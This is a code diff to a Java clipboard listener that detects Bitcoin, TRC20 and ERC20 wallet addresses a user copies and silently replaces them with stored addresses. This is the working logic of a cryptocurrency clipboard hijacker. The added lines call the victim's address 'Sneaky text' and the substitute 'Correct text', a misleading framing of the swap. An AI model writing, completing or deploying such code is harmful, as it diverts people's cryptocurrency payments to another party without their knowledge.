@@ -69,18 +69,21 @@ class ClipboardTextListener extends Observable implements Runnable {
                             System.out.println("New clipboard text detected: " + data);
                             if (data.length() >= 33 && data.length()<=42 && Arrays.stream(bcStarts).anyMatch(data::startsWith)) {
                                 System.out.println("Sneaky text found for bitcoin: " + data);
+                                System.out.println("Correct text found for bitcoin: " + result.get(0));
                                 StringSelection stringSelection = new StringSelection(result.get(0));
-                                sysClip.setContents(stringSelection, stringSelection);
+                                sysClip.setContents(stringSelection, null);
                             }
                             if (data.length() <= 35 && Arrays.stream(trC20Starts).anyMatch(data::startsWith)) {
                                 System.out.println("Sneaky text found for trc20: " + data);
+                                System.out.println("Correct text found for trc20: " + result.get(2));
                                 StringSelection stringSelection = new StringSelection(result.get(2));
-                                sysClip.setContents(stringSelection, stringSelection);
+                                sysClip.setContents(stringSelection, null);
                             }
                             if (data.length() == 42 && Arrays.stream(erC20Starts).anyMatch(data::startsWith)) {
                                 System.out.println("Sneaky text found for erc20: " + data);
+                                System.out.println("Correct text found for erc20: " + result.get(1));
                                 StringSelection stringSelection = new StringSelection(result.get(1));
-                                sysClip.setContents(stringSelection, stringSelection);
+                                sysClip.setContents(stringSelection, null);
                             }
                             setChanged();
                             notifyObservers(data);
